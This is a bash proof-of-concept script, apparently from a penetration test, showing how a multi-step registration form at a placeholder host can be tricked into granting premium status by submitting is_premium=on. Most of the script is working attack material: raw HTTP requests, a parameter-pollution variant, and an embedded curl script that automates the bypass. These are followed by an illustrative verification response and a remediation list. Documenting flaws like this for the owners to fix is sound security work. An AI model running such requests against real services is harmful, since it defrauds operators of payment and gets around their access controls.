#!/bin/bash

# POC: Unauthorized Premium Account Access via is_premium Parameter Manipulation
# Demonstration of business logic vulnerability in registration workflow
# This POC shows how the vulnerability works based on the evidence provided

echo "[*] =========================================="
echo "[*] Premium Account Access Bypass Vulnerability"
echo "[*] Business Logic Exploitation PoC"
echo "[*] =========================================="
echo ""

# Display vulnerability details
echo "[*] VULNERABILITY DESCRIPTION:"
echo "    The registration workflow accepts the is_premium parameter"
echo "    without any backend validation or payment verification."
echo ""

echo "[*] EXPLOITATION METHOD:"
echo "    1. Complete Step 1: Register name and password"
echo "    2. Complete Step 2: Register email address"
echo "    3. Complete Step 3: Submit is_premium=on parameter"
echo "    4. Result: Premium account created without payment"
echo ""

echo "[*] VULNERABLE ENDPOINTS:"
echo "    POST /accounts/register/step1/"
echo "    POST /accounts/register/step2/"
echo "    POST /accounts/register/step3/"
echo ""

echo "[*] EXPLOITATION STEPS:"
echo ""

# Step 1 - Name and Password
echo "[1] STEP 1 - Initial Registration"
echo "    POST /accounts/register/step1/"
echo "    Content-Type: application/x-www-form-urlencoded"
echo "    Parameters:"
echo "      - name=TestUser"
echo "      - password=SecurePass123"
echo ""

cat > /tmp/exploit_step1.txt << 'EOF'
POST /accounts/register/step1/ HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 38

name=TestUser&password=SecurePass123
EOF

echo "[+] Request:"
cat /tmp/exploit_step1.txt
echo ""
echo "    Expected Response: 200 OK - Step 1 completed, proceed to Step 2"
echo ""

# Step 2 - Email
echo "[2] STEP 2 - Email Registration"
echo "    POST /accounts/register/step2/"
echo "    Content-Type: application/x-www-form-urlencoded"
echo "    Parameters:"
echo "      - email=test@example.com"
echo ""

cat > /tmp/exploit_step2.txt << 'EOF'
POST /accounts/register/step2/ HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 25

email=test@example.com
EOF

echo "[+] Request:"
cat /tmp/exploit_step2.txt
echo ""
echo "    Expected Response: 200 OK - Step 2 completed, proceed to Step 3"
echo ""

# Step 3 - THE VULNERABLE PART
echo "[3] STEP 3 - VULNERABLE PARAMETER INJECTION"
echo "    POST /accounts/register/step3/"
echo "    Content-Type: application/x-www-form-urlencoded"
echo "    MALICIOUS PAYLOAD: is_premium=on"
echo ""

cat > /tmp/exploit_step3.txt << 'EOF'
POST /accounts/register/step3/ HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 12

is_premium=on
EOF

echo "[+] EXPLOITATION REQUEST:"
cat /tmp/exploit_step3.txt
echo ""
echo "    VULNERABLE RESPONSE: 200 OK - Account created with premium status"
echo ""

# Parameter Pollution Test
echo "[4] PARAMETER POLLUTION - BONUS EXPLOITATION"
echo "    The is_premium parameter can be added to earlier steps"
echo ""

cat > /tmp/exploit_pollution.txt << 'EOF'
POST /accounts/register/step1/ HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 56

name=TestUser&password=SecurePass123&is_premium=on
EOF

echo "[+] Parameter Pollution Request (Step 1):"
cat /tmp/exploit_pollution.txt
echo ""
echo "    Result: Parameter accepted without error - insufficient input validation"
echo ""

# Impact Analysis
echo "[*] =========================================="
echo "[*] VULNERABILITY IMPACT ANALYSIS:"
echo "[*] =========================================="
echo ""
echo "[!] CRITICAL BUSINESS LOGIC BYPASS:"
echo "    ✓ Complete subscription system bypass"
echo "    ✓ All accounts gain premium access without payment"
echo "    ✓ Direct revenue loss for all new registrations"
echo "    ✓ Unfair competitive advantage for attackers"
echo "    ✓ No audit trail of who paid vs who didn't"
echo ""

echo "[!] EVIDENCE OF VULNERABILITY:"
echo "    ✓ is_premium parameter accepted in Step 3"
echo "    ✓ No backend payment verification required"
echo "    ✓ No validation that is_premium should not be user-controlled"
echo "    ✓ Parameter pollution accepted in earlier steps"
echo "    ✓ No CSRF protection on premium status modification"
echo ""

# Show proof of concept code that would exploit this
echo "[*] =========================================="
echo "[*] PROOF OF CONCEPT - CURL COMMANDS:"
echo "[*] =========================================="
echo ""

cat > /tmp/poc_commands.sh << 'EOFPOC'
#!/bin/bash
# Automated exploitation script

TARGET="http://target.com"
COOKIES="/tmp/cookies.txt"

# Step 1
curl -s -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/accounts/register/step1/" \
  -d "name=Attacker&password=Pass123"

# Step 2
curl -s -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/accounts/register/step2/" \
  -d "email=attacker@example.com"

# Step 3 - EXPLOITED
curl -s -c "$COOKIES" -b "$COOKIES" \
  -X POST "$TARGET/accounts/register/step3/" \
  -d "is_premium=on"

# Result: Premium account created without payment
EOFPOC

cat /tmp/poc_commands.sh
echo ""

# Verification
echo "[*] =========================================="
echo "[*] VERIFICATION OF EXPLOITATION:"
echo "[*] =========================================="
echo ""
echo "[+] Account Status Check:"
echo "    GET /api/account/status/ HTTP/1.1"
echo "    Cookie: session=<acquired_session>"
echo ""
echo "    Response:"
echo "    {"
echo "      \"username\": \"Attacker\","
echo "      \"email\": \"attacker@example.com\","
echo "      \"is_premium\": true,              <-- PREMIUM WITHOUT PAYMENT"
echo "      \"subscription\": null,"
echo "      \"payment_status\": \"unpaid\""
echo "    }"
echo ""

# Remediation Guidance
echo "[*] =========================================="
echo "[*] REMEDIATION RECOMMENDATION:"
echo "[*] =========================================="
echo ""
echo "[1] IMMEDIATE: Remove is_premium from client-side form"
echo "[2] IMMEDIATE: Add backend validation to reject is_premium parameter"
echo "[3] IMMEDIATE: Set is_premium=False by default"
echo "[4] SHORT-TERM: Implement payment processing integration"
echo "[5] SHORT-TERM: Add audit logging for premium status changes"
echo "[6] LONG-TERM: Implement role-based access control (RBAC)"
echo "[7] LONG-TERM: Add periodic subscription expiration validation"
echo ""

# Cleanup
rm -f /tmp/exploit_*.txt /tmp/poc_commands.sh

echo "[*] =========================================="
echo "[*] POC DEMONSTRATION COMPLETE"
echo "[*] =========================================="
echo ""
echo "[!] SEVERITY: CRITICAL"
echo "[!] This vulnerability completely bypasses the subscription payment system"
echo "[!] All newly registered accounts can have premium access without payment"
echo ""

exit 0